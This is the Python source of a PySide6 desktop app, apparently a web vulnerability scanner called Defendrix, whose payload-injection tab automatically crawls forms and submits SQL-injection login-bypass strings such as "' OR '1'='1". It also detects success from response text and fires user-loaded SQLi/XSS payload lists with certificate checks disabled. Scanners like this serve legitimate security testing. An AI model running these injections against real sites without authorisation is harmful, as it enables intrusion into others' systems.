from datetime import datetime
from PySide6.QtCore import QObject, Signal, QThread, Qt
from PySide6.QtGui import QColor, QFont
from PySide6.QtWidgets import (
    QMainWindow,
    QWidget,
    QVBoxLayout,
    QHBoxLayout,
    QLabel,
    QLineEdit,
    QPushButton,
    QTableWidget,
    QTableWidgetItem,
    QGroupBox,
    QMessageBox,
    QProgressBar,
    QFileDialog,
    QTextEdit,
    QTabWidget,
    QSpinBox,
    QCheckBox,
    QComboBox,
    QPlainTextEdit,
    QFrame,
    QScrollArea,
)

from SentinelLite.engine.scanner_engine import ScannerEngine
from SentinelLite.reporting.report_generator import ReportGenerator


class ModernStyle:
    PRIMARY_COLOR = "#0f172a"
    SECONDARY_COLOR = "#22c55e"
    ACCENT_COLOR = "#16a34a"
    SUCCESS_COLOR = "#22c55e"
    WARNING_COLOR = "#f59e0b"
    DANGER_COLOR = "#ef4444"
    DARK_BG = "#0b1220"
    TEXT_COLOR = "#22c55e"
    BORDER_COLOR = "#1f2937"


class ScanWorker(QObject):
    finished = Signal(dict)
    error = Signal(str)
    progress = Signal(str)

    def __init__(self, engine, url, options, auth):
        super().__init__()
        self.engine = engine
        self.url = url
        self.options = options
        self.auth = auth

    def run(self):
        try:
            self.progress.emit(f"🔍 Starting scan of: {self.url}")
            self.progress.emit("⚙️  Initializing scanner engine...")
            self.progress.emit("🌐 Checking external threat intelligence...")
            
            result = self.engine.start_scan(self.url, self.options, self.auth)
            
            # Check for threat intelligence results
            ti_findings = [f for f in result.get("findings", []) if f.get("source") == "ThreatIntel"]
            if ti_findings:
                self.progress.emit(f"✓ Threat intelligence check complete - {len(ti_findings)} threat(s) detected")
                for ti in ti_findings:
                    self.progress.emit(f"  → {ti.get('details', 'N/A')}")
            else:
                self.progress.emit("✓ Threat intelligence check complete - No threats detected")
            
            self.progress.emit(f"✓ Scan complete! Found {len(result.get('findings', []))} total findings")
            self.finished.emit(result)
        except Exception as exc:
            self.error.emit(str(exc))


class BruteForceWorker(QObject):
    finished = Signal(list)
    error = Signal(str)
    progress = Signal(str)
    
    def __init__(self, target_url, payloads, param_name, method, delay):
        super().__init__()
        self.target_url = target_url
        self.payloads = payloads
        self.param_name = param_name
        self.method = method
        self.delay = delay
    
    def run(self):
        import requests
        import time
        
        results = []
        total = len(self.payloads)
        
        try:
            self.progress.emit(f"🚀 Starting payload injection on: {self.target_url}")
            self.progress.emit(f"📊 Total payloads to test: {total}")
            self.progress.emit(f"🎯 Target parameter: {self.param_name}")
            self.progress.emit("=" * 60)
            
            for idx, payload in enumerate(self.payloads, 1):
                try:
                    self.progress.emit(f"[{idx}/{total}] Testing payload: {payload[:50]}...")
                    
                    if self.method == "GET":
                        response = requests.get(
                            self.target_url,
                            params={self.param_name: payload},
                            timeout=5,
                            verify=False
                        )
                    else:  # POST
                        response = requests.post(
                            self.target_url,
                            data={self.param_name: payload},
                            timeout=5,
                            verify=False
                        )
                    
                    result = {
                        "payload": payload,
                        "status_code": response.status_code,
                        "response_length": len(response.content),
                        "response_time": response.elapsed.total_seconds(),
                        "interesting": self._is_interesting(response)
                    }
                    
                    results.append(result)
                    
                    if result["interesting"]:
                        self.progress.emit(f"  ⚠️  INTERESTING RESPONSE! Status: {response.status_code}, Length: {len(response.content)}")
                    
                    time.sleep(self.delay / 1000.0)
                    
                except Exception as e:
                    self.progress.emit(f"  ❌ Error with payload: {str(e)[:50]}")
                    continue
            
            self.progress.emit("=" * 60)
            interesting_count = sum(1 for r in results if r["interesting"])
            self.progress.emit(f"✓ Injection complete! {interesting_count} interesting responses found")
            self.finished.emit(results)
            
        except Exception as e:
            self.error.emit(str(e))
    
    def _is_interesting(self, response):
        """Detect potentially interesting responses"""
        error_patterns = [
            "error", "exception", "sql", "mysql", "syntax", 
            "database", "warning", "fatal", "stack trace",
            "undefined", "unexpected", "invalid"
        ]
        
        text = response.text.lower()
        
        # Check for errors in response
        if any(pattern in text for pattern in error_patterns):
            return True
        
        # Check for unusual status codes
        if response.status_code not in [200, 301, 302, 404]:
            return True
        
        # Check for very short or very long responses
        if len(response.content) < 100 or len(response.content) > 50000:
            return True
        
        return False


class SmartScanWorker(QObject):
    """Worker for smart automatic scanning - discovers and tests all forms"""
    finished = Signal(list)
    error = Signal(str)
    progress = Signal(str)
    
    def __init__(self, base_url):
        super().__init__()
        self.base_url = base_url
    
    def run(self):
        import requests
        from bs4 import BeautifulSoup
        import time
        
        try:
            # Step 1: Discover forms
            self.progress.emit("🔍 Crawling website to discover forms...")
            session = requests.Session()
            
            try:
                response = session.get(self.base_url, timeout=10, verify=False)
                self.progress.emit(f"✓ Retrieved base page (Status: {response.status_code})")
            except Exception as e:
                self.error.emit(f"Failed to connect to {self.base_url}: {str(e)}")
                return
            
            # Parse HTML and find forms
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            
            self.progress.emit(f"✓ Found {len(forms)} form(s) on the page")
            
            if not forms:
                self.progress.emit("ℹ️  No forms found. Checking for URL parameters...")
                # TODO: Could add URL parameter detection here
                self.finished.emit([])
                return
            
            # Step 2: Test each form
            all_results = []
            
            for form_idx, form in enumerate(forms, 1):
                self.progress.emit("")
                self.progress.emit(f"📋 Testing Form #{form_idx}/{len(forms)}")
                self.progress.emit("-" * 60)
                
                # Get form action and method
                action = form.get('action', '')
                method = form.get('method', 'GET').upper()
                
                # Build form action URL
                if action:
                    if action.startswith('http'):
                        form_url = action
                    elif action.startswith('/'):
                        from urllib.parse import urlparse
                        parsed = urlparse(self.base_url)
                        form_url = f"{parsed.scheme}://{parsed.netloc}{action}"
                    else:
                        form_url = f"{self.base_url.rstrip('/')}/{action}"
                else:
                    form_url = self.base_url
                
                self.progress.emit(f"   URL: {form_url}")
                self.progress.emit(f"   Method: {method}")
                
                # Get form inputs
                inputs = form.find_all(['input', 'textarea', 'select'])
                input_names = []
                for inp in inputs:
                    name = inp.get('name')
                    if name:
                        input_names.append(name)
                
                if not input_names:
                    self.progress.emit("   ⚠️  No input fields found in this form")
                    continue
                
                self.progress.emit(f"   Inputs: {', '.join(input_names)}")
                
                # Test each input with SQLi payloads
                sqli_payloads = [
                    "admin' --",
                    "' OR '1'='1",
                    "' OR '1'='1' --",
                    "admin' #"
                ]
                
                self.progress.emit(f"   🧪 Testing {len(input_names)} input(s) with {len(sqli_payloads)} payloads...")
                
                for input_name in input_names:
                    for payload in sqli_payloads:
                        try:
                            # Build form data
                            form_data = {}
                            for inp_name in input_names:
                                if inp_name == input_name:
                                    form_data[inp_name] = payload
                                else:
                                    # Fill other fields with dummy data
                                    if 'pass' in inp_name.lower():
                                        form_data[inp_name] = "test123"
                                    else:
                                        form_data[inp_name] = "test"
                            
                            start_time = time.time()
                            
                            if method == "POST":
                                test_response = session.post(form_url, data=form_data, timeout=5, verify=False)
                            else:
                                test_response = session.get(form_url, params=form_data, timeout=5, verify=False)
                            
                            elapsed_time = time.time() - start_time
                            
                            # Check if response is interesting
                            is_interesting = self._is_interesting(test_response)
                            
                            result = {
                                'payload': f"{input_name}={payload}",
                                'status_code': test_response.status_code,
                                'response_length': len(test_response.content),
                                'response_time': elapsed_time,
                                'interesting': is_interesting
                            }
                            
                            all_results.append(result)
                            
                            if is_interesting:
                                self.progress.emit(f"      ⚠️  INTERESTING! {input_name}={payload[:20]}... → Status: {test_response.status_code}")
                            
                            time.sleep(0.1)  # Small delay to be respectful
                            
                        except Exception as e:
                            self.progress.emit(f"      ❌ Error testing {input_name}: {str(e)}")
            
            # Step 3: Done
            self.progress.emit("")
            self.finished.emit(all_results)
            
        except Exception as e:
            self.error.emit(f"Smart scan error: {str(e)}")
    
    def _is_interesting(self, response):
        """Detect potentially interesting responses"""
        # Check for redirects (often indicates successful bypass)
        if response.status_code in [301, 302, 303]:
            return True
        
        # Check for errors
        error_patterns = [
            "error", "exception", "sql", "mysql", "syntax",
            "database", "warning", "fatal", "stack trace"
        ]
        
        text = response.text.lower()
        if any(pattern in text for pattern in error_patterns):
            return True
        
        # Check for authentication success indicators
        success_patterns = [
            "welcome", "logout", "dashboard", "account",
            "profile", "balance", "admin", "sign out"
        ]
        
        if any(pattern in text for pattern in success_patterns):
            return True
        
        # Check for unusual status codes
        if response.status_code not in [200, 301, 302, 404]:
            return True
        
        return False


class VulnerabilityScanner(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Defendrix - Advanced Web Application Vulnerability Scanner")
        self.resize(1200, 800)

        self.engine = ScannerEngine()
        self.reporter = ReportGenerator()
        self.scan_thread = None
        self.scan_worker = None
        self.bruteforce_thread = None
        self.bruteforce_worker = None

        self.setup_ui()

    def setup_ui(self):
        self.setStyleSheet(
            f"QMainWindow {{ background: {ModernStyle.DARK_BG}; }}"
            f"QWidget {{ font-family: 'Segoe UI'; font-size: 12px; color: {ModernStyle.TEXT_COLOR}; }}"
            f"QLineEdit {{ padding: 6px; border: 1px solid {ModernStyle.BORDER_COLOR}; border-radius: 6px; background: #0f172a; color: {ModernStyle.TEXT_COLOR}; }}"
            f"QPushButton {{ border-radius: 6px; padding: 6px 12px; background: {ModernStyle.ACCENT_COLOR}; color: #0b1220; font-weight: bold; }}"
            f"QPushButton:disabled {{ background: #1f2937; color: #9ca3af; }}"
            f"QTableWidget {{ background: #111827; border: 1px solid {ModernStyle.BORDER_COLOR}; }}"
            f"QHeaderView::section {{ background: #1f2937; padding: 6px; border: 0; }}"
            f"QProgressBar {{ border: 1px solid {ModernStyle.BORDER_COLOR}; border-radius: 6px; text-align: center; background: #0f172a; }}"
            f"QProgressBar::chunk {{ background: {ModernStyle.SUCCESS_COLOR}; border-radius: 6px; }}"
            f"QTextEdit, QPlainTextEdit {{ background: #0f172a; border: 1px solid {ModernStyle.BORDER_COLOR}; border-radius: 6px; color: {ModernStyle.TEXT_COLOR}; font-family: 'Consolas', 'Courier New'; }}"
            f"QTabWidget::pane {{ border: 1px solid {ModernStyle.BORDER_COLOR}; background: {ModernStyle.DARK_BG}; }}"
            f"QTabBar::tab {{ background: #1f2937; color: {ModernStyle.TEXT_COLOR}; padding: 10px 20px; border-radius: 6px 6px 0 0; margin-right: 2px; }}"
            f"QTabBar::tab:selected {{ background: {ModernStyle.ACCENT_COLOR}; color: #0b1220; }}"
            f"QSpinBox, QComboBox {{ padding: 6px; border: 1px solid {ModernStyle.BORDER_COLOR}; border-radius: 6px; background: #0f172a; color: {ModernStyle.TEXT_COLOR}; }}"
            f"QCheckBox {{ color: {ModernStyle.TEXT_COLOR}; }}"

        )

        central = QWidget()
        layout = QVBoxLayout(central)
        layout.setContentsMargins(16, 16, 16, 16)
        layout.setSpacing(12)

        header = QLabel("🛡️ Defendrix - Web Security Scanner")
        header.setStyleSheet(f"font-size: 20px; font-weight: 700; color: {ModernStyle.TEXT_COLOR};")
        layout.addWidget(header)

        # Create tab widget
        self.tab_widget = QTabWidget()
        self.tab_widget.addTab(self.create_scanner_tab(), "🔍 Vulnerability Scanner")
        self.tab_widget.addTab(self.create_bruteforce_tab(), "💉 Payload Injection")
        
        layout.addWidget(self.tab_widget)
        self.setCentralWidget(central)

    def create_scanner_tab(self):
        """Original vulnerability scanner tab"""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        layout.setContentsMargins(10, 10, 10, 10)
        layout.setSpacing(12)

        input_group = QGroupBox("Target Configuration")
        input_layout = QVBoxLayout(input_group)

        self.url_input = QLineEdit("https://")
        self.url_input.setPlaceholderText("Target URL (e.g., https://example.com)")
        input_layout.addWidget(QLabel("🎯 Target URL"))
        input_layout.addWidget(self.url_input)

        self.login_url_input = QLineEdit("")
        self.login_url_input.setPlaceholderText("Login URL (optional)")
        input_layout.addWidget(QLabel("🔐 Login URL (optional)"))
        input_layout.addWidget(self.login_url_input)

        creds_row = QHBoxLayout()
        self.username_input = QLineEdit("")
        self.username_input.setPlaceholderText("Username")
        self.password_input = QLineEdit("")
        self.password_input.setPlaceholderText("Password")
        self.password_input.setEchoMode(QLineEdit.Password)
        creds_row.addWidget(self.username_input)
        creds_row.addWidget(self.password_input)
        input_layout.addWidget(QLabel("👤 Credentials (optional)"))
        input_layout.addLayout(creds_row)

        action_row = QHBoxLayout()
        self.scan_button = QPushButton("🚀 Start Scan")
        self.scan_button.clicked.connect(self.start_scan)
        action_row.addWidget(self.scan_button)

        self.report_button = QPushButton("📄 Generate Report")
        self.report_button.setEnabled(False)
        self.report_button.clicked.connect(self.generate_report)
        action_row.addWidget(self.report_button)
        action_row.addStretch()
        input_layout.addLayout(action_row)

        layout.addWidget(input_group)

        self.progress_bar = QProgressBar()
        self.progress_bar.setRange(0, 100)
        self.progress_bar.setValue(0)
        layout.addWidget(self.progress_bar)

        # Output Console
        console_group = QGroupBox("📊 Scan Output  Threat Intelligence")
        console_layout = QVBoxLayout(console_group)
        self.output_console = QTextEdit()
        self.output_console.setReadOnly(True)
        self.output_console.setMaximumHeight(120)
        self.output_console.setPlainText("Ready to scan. Threat intelligence integration is active.\nEnter a URL and click 'Start Scan' to begin...")
        console_layout.addWidget(self.output_console)
        layout.addWidget(console_group)

        surface_group = QGroupBox("🗺️ Attack Surface Summary")
        surface_layout = QHBoxLayout(surface_group)
        self.surface_labels = {}
        self.surface_labels["endpoints"] = QLabel("Endpoints: 0")
        self.surface_labels["parameters"] = QLabel("Parameters: 0")
        self.surface_labels["forms"] = QLabel("Forms: 0")
        self.surface_labels["input_vectors"] = QLabel("Input Vectors: 0")
        surface_layout.addWidget(self.surface_labels["endpoints"])
        surface_layout.addWidget(self.surface_labels["parameters"])
        surface_layout.addWidget(self.surface_labels["forms"])
        surface_layout.addWidget(self.surface_labels["input_vectors"])
        surface_layout.addStretch()
        layout.addWidget(surface_group)

        results_group = QGroupBox("🔍 Vulnerability Findings")
        results_layout = QVBoxLayout(results_group)
        self.results_table = QTableWidget(0, 8)
        self.results_table.setHorizontalHeaderLabels([
            "Type",
            "OWASP",
            "Severity",
            "Confidence",
            "Endpoint",
            "Payload",
            "Details",
            "Source",
        ])
        self.results_table.horizontalHeader().setStretchLastSection(True)
        self.results_table.verticalHeader().setVisible(False)
        results_layout.addWidget(self.results_table)
        layout.addWidget(results_group)

        self.last_result = None
        return tab

    def create_bruteforce_tab(self):
        """New brute force / payload injection tab with professional UI and scroll area"""
        # Main tab widget
        tab = QWidget()
        tab_layout = QVBoxLayout(tab)
        tab_layout.setContentsMargins(0, 0, 0, 0)
        tab_layout.setSpacing(0)
        
        # Create scroll area
        scroll_area = QScrollArea()
        scroll_area.setWidgetResizable(True)
        scroll_area.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        scroll_area.setVerticalScrollBarPolicy(Qt.ScrollBarAsNeeded)
        scroll_area.setStyleSheet(
            "QScrollArea { "
            "border: none; "
            "background: transparent; "
            "} "
            "QScrollBar:vertical { "
            "border: none; "
            "background: #1f2937; "
            "width: 12px; "
            "border-radius: 6px; "
            "} "
            "QScrollBar::handle:vertical { "
            "background: #3b82f6; "
            "border-radius: 6px; "
            "min-height: 30px; "
            "} "
            "QScrollBar::handle:vertical:hover { "
            "background: #2563eb; "
            "} "
            "QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical { "
            "height: 0px; "
            "} "
            "QScrollBar::add-page:vertical, QScrollBar::sub-page:vertical { "
            "background: none; "
            "}"
        )
        
        # Content widget that will be scrollable
        content_widget = QWidget()
        main_layout = QVBoxLayout(content_widget)
        main_layout.setContentsMargins(20, 20, 20, 20)
        main_layout.setSpacing(20)
        
        # Instructions - Compact and Clear
        instructions = QLabel(
            "💡 <b>User-Friendly Mode:</b> Just enter the website URL below and click 'Smart Scan'. "
            "The tool will automatically discover and test all forms, parameters, and endpoints!<br>"
            "<b>Advanced Mode:</b> Or manually specify a specific endpoint, parameter, and method below."
        )
        instructions.setWordWrap(True)
        instructions.setStyleSheet(
            "padding: 15px; "
            "background-color: #1e3a8a; "
            "border-radius: 8px; "
            "color: #dbeafe; "
            "border-left: 5px solid #3b82f6; "
            "font-size: 13px; "
            "line-height: 1.5;"
        )
        main_layout.addWidget(instructions)
        
        # ============================================================
        # SMART SCAN SECTION - Prominent and Easy to Use
        # ============================================================
        smart_scan_group = QGroupBox("🚀 Smart Scan (Automatic - Recommended)")
        smart_scan_group.setStyleSheet(
            "QGroupBox { "
            "font-weight: bold; "
            "font-size: 15px; "
            "border: 3px solid #22c55e; "
            "border-radius: 10px; "
            "margin-top: 15px; "
            "padding: 20px 15px 15px 15px; "
            "background-color: #0a2818; "
            "} "
            "QGroupBox::title { "
            "subcontrol-origin: margin; "
            "left: 15px; "
            "padding: 5px 10px; "
            "background-color: #22c55e; "
            "color: #0a2818; "
            "border-radius: 5px; "
            "}"
        )
        smart_scan_layout = QVBoxLayout()
        smart_scan_layout.setSpacing(15)
        
        # URL Input Row
        smart_url_container = QHBoxLayout()
        smart_url_container.setSpacing(10)
        smart_url_label = QLabel("🌐 Website URL:")
        smart_url_label.setStyleSheet("font-weight: bold; font-size: 14px; color: #10b981;")
        smart_url_label.setMinimumWidth(130)
        smart_url_container.addWidget(smart_url_label)
        
        self.smart_url_input = QLineEdit()
        self.smart_url_input.setPlaceholderText("https://example.com (tool will find and test all forms automatically)")
        self.smart_url_input.setStyleSheet(
            "QLineEdit { "
            "padding: 10px 15px; "
            "font-size: 13px; "
            "border: 2px solid #374151; "
            "border-radius: 6px; "
            "background: #1f2937; "
            "color: #f3f4f6; "
            "} "
            "QLineEdit:focus { "
            "border-color: #22c55e; "
            "background: #111827; "
            "}"
        )
        self.smart_url_input.setMinimumHeight(38)
        smart_url_container.addWidget(self.smart_url_input)
        smart_scan_layout.addLayout(smart_url_container)
        
        # Smart Scan Button
        smart_scan_btn = QPushButton("🔍 Smart Scan - Auto-Detect & Test Everything")
        smart_scan_btn.setStyleSheet(
            "QPushButton { "
            "background: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 #22c55e, stop:1 #16a34a); "
            "color: white; "
            "font-weight: bold; "
            "font-size: 14px; "
            "padding: 12px; "
            "border-radius: 8px; "
            "border: none; "
            "min-height: 45px; "
            "} "
            "QPushButton:hover { "
            "background: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 #16a34a, stop:1 #15803d); "
            "} "
            "QPushButton:pressed { "
            "background: #15803d; "
            "}"
        )
        smart_scan_btn.clicked.connect(self.start_smart_scan)
        smart_scan_layout.addWidget(smart_scan_btn)
        
        smart_scan_group.setLayout(smart_scan_layout)
        main_layout.addWidget(smart_scan_group)
        
        # ============================================================
        # MANUAL TESTING SECTION - For Advanced Users
        # ============================================================
        manual_group = QGroupBox("⚙️ Manual Testing (Advanced Users)")
        manual_group.setStyleSheet(
            "QGroupBox { "
            "font-weight: bold; "
            "font-size: 15px; "
            "border: 2px solid #64748b; "
            "border-radius: 10px; "
            "margin-top: 15px; "
            "padding: 20px 15px 15px 15px; "
            "background-color: #0f1419; "
            "} "
            "QGroupBox::title { "
            "subcontrol-origin: margin; "
            "left: 15px; "
            "padding: 5px 10px; "
            "background-color: #64748b; "
            "color: white; "
            "border-radius: 5px; "
            "}"
        )
        manual_layout = QVBoxLayout()
        manual_layout.setSpacing(15)
        
        # Target URL
        url_container = QVBoxLayout()
        url_container.setSpacing(8)
        url_label = QLabel("🎯 Target URL")
        url_label.setStyleSheet("font-weight: bold; font-size: 13px; color: #94a3b8;")
        url_container.addWidget(url_label)
        self.bf_url_input = QLineEdit("https://")
        self.bf_url_input.setPlaceholderText("e.g., https://example.com/search or https://example.com/login")
        self.bf_url_input.setStyleSheet(
            "padding: 8px 12px; "
            "font-size: 13px; "
            "border: 2px solid #374151; "
            "border-radius: 6px; "
            "background: #1f2937; "
            "color: #f3f4f6; "
        )
        self.bf_url_input.setMinimumHeight(36)
        url_container.addWidget(self.bf_url_input)
        manual_layout.addLayout(url_container)

        # Parameter Name
        param_container = QVBoxLayout()
        param_container.setSpacing(8)
        param_label = QLabel("📝 Parameter Name")
        param_label.setStyleSheet("font-weight: bold; font-size: 13px; color: #94a3b8;")
        param_container.addWidget(param_label)
        self.bf_param_input = QLineEdit("q")
        self.bf_param_input.setPlaceholderText("e.g., q, id, search, user, uid")
        self.bf_param_input.setStyleSheet(
            "padding: 8px 12px; "
            "font-size: 13px; "
            "border: 2px solid #374151; "
            "border-radius: 6px; "
            "background: #1f2937; "
            "color: #f3f4f6; "
        )
        self.bf_param_input.setMinimumHeight(36)
        param_container.addWidget(self.bf_param_input)
        manual_layout.addLayout(param_container)

        # Settings Row - Method and Delay Side by Side
        settings_container = QHBoxLayout()
        settings_container.setSpacing(15)
        
        # HTTP Method
        method_container = QVBoxLayout()
        method_container.setSpacing(8)
        method_label = QLabel("📡 HTTP Method")
        method_label.setStyleSheet("font-weight: bold; font-size: 13px; color: #94a3b8;")
        method_container.addWidget(method_label)
        self.bf_method_combo = QComboBox()
        self.bf_method_combo.addItems(["GET", "POST"])
        self.bf_method_combo.setStyleSheet(
            "padding: 8px 12px; "
            "font-size: 13px; "
            "border: 2px solid #374151; "
            "border-radius: 6px; "
            "background: #1f2937; "
            "color: #f3f4f6; "
        )
        self.bf_method_combo.setMinimumHeight(36)
        method_container.addWidget(self.bf_method_combo)
        settings_container.addLayout(method_container, 1)

        # Delay
        delay_container = QVBoxLayout()
        delay_container.setSpacing(8)
        delay_label = QLabel("⏱️ Delay (ms)")
        delay_label.setStyleSheet("font-weight: bold; font-size: 13px; color: #94a3b8;")
        delay_container.addWidget(delay_label)
        self.bf_delay_spin = QSpinBox()
        self.bf_delay_spin.setRange(0, 5000)
        self.bf_delay_spin.setValue(100)
        self.bf_delay_spin.setStyleSheet(
            "padding: 8px 12px; "
            "font-size: 13px; "
            "border: 2px solid #374151; "
            "border-radius: 6px; "
            "background: #1f2937; "
            "color: #f3f4f6; "
        )
        self.bf_delay_spin.setMinimumHeight(36)
        delay_container.addWidget(self.bf_delay_spin)
        settings_container.addLayout(delay_container, 1)
        
        manual_layout.addLayout(settings_container)
        manual_group.setLayout(manual_layout)
        main_layout.addWidget(manual_group)

        # ============================================================
        # PAYLOAD LIST SECTION
        # ============================================================
        payload_group = QGroupBox("📋 Payload List")
        payload_group.setStyleSheet(
            "QGroupBox { "
            "font-weight: bold; "
            "font-size: 14px; "
            "border: 2px solid #64748b; "
            "border-radius: 10px; "
            "margin-top: 15px; "
            "padding: 20px 15px 15px 15px; "
            "} "
            "QGroupBox::title { "
            "subcontrol-origin: margin; "
            "left: 15px; "
            "padding: 5px 10px; "
            "}"
        )
        payload_layout = QVBoxLayout()
        payload_layout.setSpacing(12)

        # Preset Buttons Row
        preset_container = QHBoxLayout()
        preset_container.setSpacing(10)
        
        preset_label = QLabel("Quick Load:")
        preset_label.setStyleSheet("font-size: 13px; font-weight: bold;")
        preset_label.setMinimumWidth(90)
        preset_container.addWidget(preset_label)
        
        self.load_sqli_btn = QPushButton("📊 Load SQLi Payloads")
        self.load_sqli_btn.setMinimumHeight(36)
        self.load_sqli_btn.setStyleSheet(
            "background-color: #3b82f6; "
            "color: white; "
            "font-weight: bold; "
            "border-radius: 6px; "
            "padding: 8px 15px; "
        )
        self.load_sqli_btn.clicked.connect(lambda: self.load_preset_payloads("sqli"))
        preset_container.addWidget(self.load_sqli_btn)

        self.load_xss_btn = QPushButton("🔗 Load XSS Payloads")
        self.load_xss_btn.setMinimumHeight(36)
        self.load_xss_btn.setStyleSheet(
            "background-color: #3b82f6; "
            "color: white; "
            "font-weight: bold; "
            "border-radius: 6px; "
            "padding: 8px 15px; "
        )
        self.load_xss_btn.clicked.connect(lambda: self.load_preset_payloads("xss"))
        preset_container.addWidget(self.load_xss_btn)

        self.load_custom_btn = QPushButton("📁 Load from File")
        self.load_custom_btn.setMinimumHeight(36)
        self.load_custom_btn.setStyleSheet(
            "background-color: #64748b; "
            "color: white; "
            "font-weight: bold; "
            "border-radius: 6px; "
            "padding: 8px 15px; "
        )
        self.load_custom_btn.clicked.connect(self.load_custom_payloads)
        preset_container.addWidget(self.load_custom_btn)

        preset_container.addStretch()
        payload_layout.addLayout(preset_container)

        # Payload Text Area
        self.payload_text = QPlainTextEdit()
        self.payload_text.setPlaceholderText("Enter payloads (one per line) or use quick load buttons above...")
        self.payload_text.setStyleSheet(
            "padding: 10px; "
            "font-size: 12px; "
            "font-family: 'Consolas', 'Courier New', monospace; "
            "border: 2px solid #374151; "
            "border-radius: 6px; "
            "background: #0f172a; "
            "color: #10b981; "
        )
        self.payload_text.setMinimumHeight(120)
        self.payload_text.setMaximumHeight(160)
        payload_layout.addWidget(self.payload_text)

        payload_group.setLayout(payload_layout)
        main_layout.addWidget(payload_group)

        # ============================================================
        # ACTION BUTTONS
        # ============================================================
        action_container = QHBoxLayout()
        action_container.setSpacing(12)
        
        self.bf_start_btn = QPushButton("🚀 Start Injection")
        self.bf_start_btn.setMinimumHeight(50)
        self.bf_start_btn.setStyleSheet(
            "QPushButton { "
            "background: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 #3b82f6, stop:1 #2563eb); "
            "color: white; "
            "font-weight: bold; "
            "font-size: 14px; "
            "padding: 10px 20px; "
            "border-radius: 8px; "
            "border: none; "
            "} "
            "QPushButton:hover { "
            "background: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 #2563eb, stop:1 #1d4ed8); "
            "} "
            "QPushButton:pressed { background: #1d4ed8; }"
        )
        self.bf_start_btn.clicked.connect(self.start_bruteforce)
        action_container.addWidget(self.bf_start_btn, 2)

        self.bf_stop_btn = QPushButton("⏹️ Stop")
        self.bf_stop_btn.setMinimumHeight(45)
        self.bf_stop_btn.setEnabled(False)
        self.bf_stop_btn.setStyleSheet(
            "QPushButton { "
            "background: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 #ef4444, stop:1 #dc2626); "
            "color: white; "
            "font-weight: bold; "
            "font-size: 14px; "
            "padding: 10px 20px; "
            "border-radius: 8px; "
            "border: none; "
            "} "
            "QPushButton:hover { "
            "background: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 #dc2626, stop:1 #b91c1c); "
            "} "
            "QPushButton:disabled { background: #374151; color: #9ca3af; }"
        )
        action_container.addWidget(self.bf_stop_btn, 1)

        self.bf_export_btn = QPushButton("💾 Export Results")
        self.bf_export_btn.setMinimumHeight(45)
        self.bf_export_btn.setEnabled(False)
        self.bf_export_btn.setStyleSheet(
            "QPushButton { "
            "background: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 #10b981, stop:1 #059669); "
            "color: white; "
            "font-weight: bold; "
            "font-size: 14px; "
            "padding: 10px 20px; "
            "border-radius: 8px; "
            "border: none; "
            "} "
            "QPushButton:hover { "
            "background: qlineargradient(x1:0, y1:0, x2:0, y2:1, stop:0 #059669, stop:1 #047857); "
            "} "
            "QPushButton:disabled { background: #374151; color: #9ca3af; }"
        )
        self.bf_export_btn.clicked.connect(self.export_bruteforce_results)
        action_container.addWidget(self.bf_export_btn, 1)

        main_layout.addLayout(action_container)

        # ============================================================
        # PROGRESS BAR
        # ============================================================
        self.bf_progress_bar = QProgressBar()
        self.bf_progress_bar.setRange(0, 100)
        self.bf_progress_bar.setValue(0)
        self.bf_progress_bar.setMinimumHeight(28)
        self.bf_progress_bar.setStyleSheet(
            "QProgressBar { "
            "border: 2px solid #374151; "
            "border-radius: 8px; "
            "text-align: center; "
            "background: #1f2937; "
            "color: white; "
            "font-weight: bold; "
            "font-size: 13px; "
            "} "
            "QProgressBar::chunk { "
            "background: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #3b82f6, stop:1 #8b5cf6); "
            "border-radius: 6px; "
            "}"
        )
        main_layout.addWidget(self.bf_progress_bar)

        # ============================================================
        # OUTPUT CONSOLE
        # ============================================================
        console_group = QGroupBox("📊 Injection Output")
        console_group.setStyleSheet(
            "QGroupBox { "
            "font-weight: bold; "
            "font-size: 14px; "
            "border: 2px solid #64748b; "
            "border-radius: 10px; "
            "margin-top: 10px; "
            "padding: 15px; "
            "}"
        )
        console_layout = QVBoxLayout(console_group)
        self.bf_console = QTextEdit()
        self.bf_console.setReadOnly(True)
        self.bf_console.setMinimumHeight(100)
        self.bf_console.setMaximumHeight(130)
        self.bf_console.setStyleSheet(
            "padding: 10px; "
            "font-size: 12px; "
            "font-family: 'Consolas', 'Courier New', monospace; "
            "border: 2px solid #374151; "
            "border-radius: 6px; "
            "background: #0f172a; "
            "color: #10b981; "
        )
        self.bf_console.setPlainText("Configure settings and click 'Start Injection' to begin payload testing...")
        console_layout.addWidget(self.bf_console)
        main_layout.addWidget(console_group)

        # ============================================================
        # RESULTS TABLE
        # ============================================================
        results_group = QGroupBox("📈 Injection Results")
        results_group.setStyleSheet(
            "QGroupBox { "
            "font-weight: bold; "
            "font-size: 14px; "
            "border: 2px solid #64748b; "
            "border-radius: 10px; "
            "margin-top: 10px; "
            "padding: 15px; "
            "}"
        )
        results_layout = QVBoxLayout(results_group)
        self.bf_results_table = QTableWidget(0, 5)
        self.bf_results_table.setHorizontalHeaderLabels([
            "Payload",
            "Status Code",
            "Response Length",
            "Response Time (s)",
            "Interesting"
        ])
        self.bf_results_table.horizontalHeader().setStretchLastSection(True)
        self.bf_results_table.setMinimumHeight(180)
        self.bf_results_table.setStyleSheet(
            "QTableWidget { "
            "background: #111827; "
            "border: 2px solid #374151; "
            "border-radius: 6px; "
            "gridline-color: #374151; "
            "} "
            "QHeaderView::section { "
            "background: #1f2937; "
            "color: #f3f4f6; "
            "padding: 8px; "
            "border: none; "
            "font-weight: bold; "
            "}"
        )
        results_layout.addWidget(self.bf_results_table)
        main_layout.addWidget(results_group)
        
        # Set the content widget for the scroll area
        scroll_area.setWidget(content_widget)
        tab_layout.addWidget(scroll_area)

        return tab

    def load_preset_payloads(self, payload_type):
        """Load preset payloads"""
